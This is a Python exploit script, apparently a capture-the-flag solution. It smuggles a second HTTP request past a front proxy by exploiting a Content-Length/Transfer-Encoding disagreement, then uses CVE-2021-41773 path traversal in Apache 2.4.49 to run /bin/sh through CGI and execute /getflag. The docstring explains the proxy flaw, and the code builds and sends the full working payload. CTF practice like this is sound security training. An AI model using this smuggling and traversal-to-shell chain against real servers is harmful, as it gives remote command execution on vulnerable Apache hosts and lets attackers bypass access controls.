#!/usr/bin/env python3
"""duplex -- CL.TE request smuggling past the front proxy, then CVE-2021-41773.

The custom `proxy` in front of Apache only lets two paths through:

    path_allowed(p) := strcmp(p, "/") == 0 || strcmp(p, "/health") == 0

everything else gets a 403 before it ever reaches the backend.  But the two
sides disagree about where a request ends:

  * the proxy sizes the request with **Content-Length only** -- it parses
    Transfer-Encoding (has_transfer_encoding) but never uses it to frame;
  * when forwarding, if Transfer-Encoding is present it **strips the
    Content-Length header**, so Apache sees a clean chunked request and
    happily parses the body as chunks.

So the proxy reads hdr+CL bytes and validates only the outer request line,
while Apache ends the first request at "0\r\n\r\n" and treats the remaining
bytes as a *second* request that was never path-checked.

The backend is httpd 2.4.49 with `<Directory /> Require all granted` and
mod_cgid loaded -- textbook CVE-2021-41773, so the smuggled request is a
traversal into /bin/sh and the POST body is the shell script that runs
/getflag (mode 111, root-owned, and Apache runs as `daemon`, so --x applies).
"""
import os
import re
import socket
import sys

HOST = os.environ.get("DUPLEX_HOST", "vm2.secso.cc")
PORT = int(os.environ.get("DUPLEX_PORT", "20099"))

CGI = b"echo Content-Type: text/plain; echo; /getflag\n"

smuggled = (
    b"POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Content-Length: " + str(len(CGI)).encode() + b"\r\n"
    b"\r\n" + CGI
)

# The first request's chunked body is empty; everything after the terminator
# is what Apache will read as the next request on the same connection.
body = b"0\r\n\r\n" + smuggled

front = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"\r\n"
)

s = socket.create_connection((HOST, PORT), timeout=20)
s.sendall(front + body)

s.settimeout(8)
out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass

print(out.decode(errors="replace"))
m = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
if m:
    print("\n[+] FLAG:", m.group(1).decode())
else:
    sys.exit("[-] no flag in response")
